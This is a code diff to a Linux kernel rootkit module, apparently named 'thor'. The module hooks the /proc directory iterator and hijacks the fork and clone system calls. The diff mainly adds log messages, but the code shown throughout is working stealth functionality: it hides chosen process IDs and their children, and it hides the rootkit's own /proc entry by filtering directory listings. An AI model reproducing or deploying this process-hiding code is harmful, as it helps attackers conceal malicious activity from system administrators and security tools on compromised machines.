@@ -105,9 +105,12 @@ int pidhider_init(void)
 
     INIT_LIST_HEAD(&pid_list.list);
 
+    LOG_INFO("hooking /proc readdir / iterate");
+
     /* insert our modified iterate for /proc */
     procroot = procfile->parent;
     proc_fops = (struct file_operations*) procroot->proc_fops;
+
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
     orig_proc_iterate = proc_fops->readdir;
 #else
@@ -135,8 +138,11 @@ int pidhider_init(void)
         return -1;
     }
 
+    LOG_INFO("hijacking fork");
+
     hijack(sys_fork, thor_fork);
 #ifdef __ARCH_WANT_SYS_CLONE
+    LOG_INFO("hijacking clone");
     hijack(sys_clone, thor_clone);
 #endif
 
@@ -147,6 +153,9 @@ void pidhider_cleanup(void)
 {
     if (proc_fops != NULL && orig_proc_iterate != NULL) {
         void *iterate_addr = orig_proc_iterate;
+
+        LOG_INFO("unhooking /proc readdir / iterate");
+
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
         write_no_prot(&proc_fops->readdir, &iterate_addr, sizeof(void*));
 #else
@@ -156,11 +165,15 @@ void pidhider_cleanup(void)
 
     clear_pid_list();
 
-    if (sys_fork != NULL)
+    if (sys_fork != NULL) {
+        LOG_INFO("unhijacking fork");
         unhijack(sys_fork);
+    }
 #ifdef __ARCH_WANT_SYS_CLONE
-    if (sys_clone != NULL)
+    if (sys_clone != NULL) {
+        LOG_INFO("unhijacking clone");
         unhijack(sys_clone);
+    }
 #endif
 }
 
@@ -181,8 +194,8 @@ static long thor_fork(void)
     /* if mother process was hidden child process */
     if(hidden && ret != -1 && ret != 0) {
         char pidname[6];
-        LOG_DEBUG("(thor_fork) hiding child process: %hu", (unsigned short)ret);
-        snprintf(pidname, 6, "%hu", (unsigned short)ret);
+        LOG_INFO("(fork) hiding child process: %hu", (unsigned short) ret);
+        snprintf(pidname, 6, "%hu", (unsigned short) ret);
         add_to_pid_list(pidname, strlen(pidname)+1);
     }
 
@@ -249,8 +262,8 @@ long thor_clone(unsigned long clone_flags, unsigned long newsp,
     /* if mother process was hidden child process */
     if (hidden && ret != -1 && ret != 0) {
         char pidname[6];
-        LOG_DEBUG("(thor_clone) hiding child process: %hu", (unsigned short)ret);
-        snprintf(pidname, 6, "%hu", (unsigned short)ret);
+        LOG_INFO("(clone) hiding child process: %hu", (unsigned short) ret);
+        snprintf(pidname, 6, "%hu", (unsigned short) ret);
         add_to_pid_list(pidname, strlen(pidname)+1);
     }
 
@@ -295,13 +308,17 @@ static int thor_proc_filldir(void *buf, const char *name, int namelen,
 
     /* hide specified PIDs */
     list_for_each_entry(tmp, &(pid_list.list), list) {
-        if (strcmp(name, tmp->name) == 0)
+        if (strcmp(name, tmp->name) == 0) {
+            LOG_INFO("hiding pid %s", name);
             return 0;
+        }
     }
 
     /* hide thor itself */
-    if (strcmp(name, THOR_PROCFILE) == 0)
+    if (strcmp(name, THOR_PROCFILE) == 0) {
+        LOG_INFO("hiding /proc/" THOR_PROCFILE);
         return 0;
+    }
 
     return orig_proc_filldir(buf, name, namelen, offset, ino, d_type);
 }
@@ -309,6 +326,8 @@ static int thor_proc_filldir(void *buf, const char *name, int namelen,
 void add_to_pid_list(const char *name, unsigned int len)
 {
     struct _pid_list *tmp;
+
+    LOG_INFO("adding pid %s to hiding list", name);
 
     tmp = (struct _pid_list*) kmalloc(sizeof(struct _pid_list), GFP_KERNEL);
     tmp->name = (char*) kmalloc(len, GFP_KERNEL);
@@ -326,6 +345,7 @@ void remove_from_pid_list(const char *name, unsigned int len)
     list_for_each_safe(pos, q, &(pid_list.list)) {
         tmp = list_entry(pos, struct _pid_list, list);
         if (strncmp(tmp->name, name, len-1) == 0) {
+            LOG_INFO("removing pid %s from hiding list", name);
             list_del(pos);
             kfree(tmp->name);
             kfree(tmp);
@@ -337,6 +357,8 @@ void clear_pid_list(void)
 {
     struct _pid_list *tmp;
     struct list_head *pos, *q;
+
+    LOG_INFO("clearing pid hiding list");
 
     list_for_each_safe(pos, q, &(pid_list.list)) {
         tmp = list_entry(pos, struct _pid_list, list);
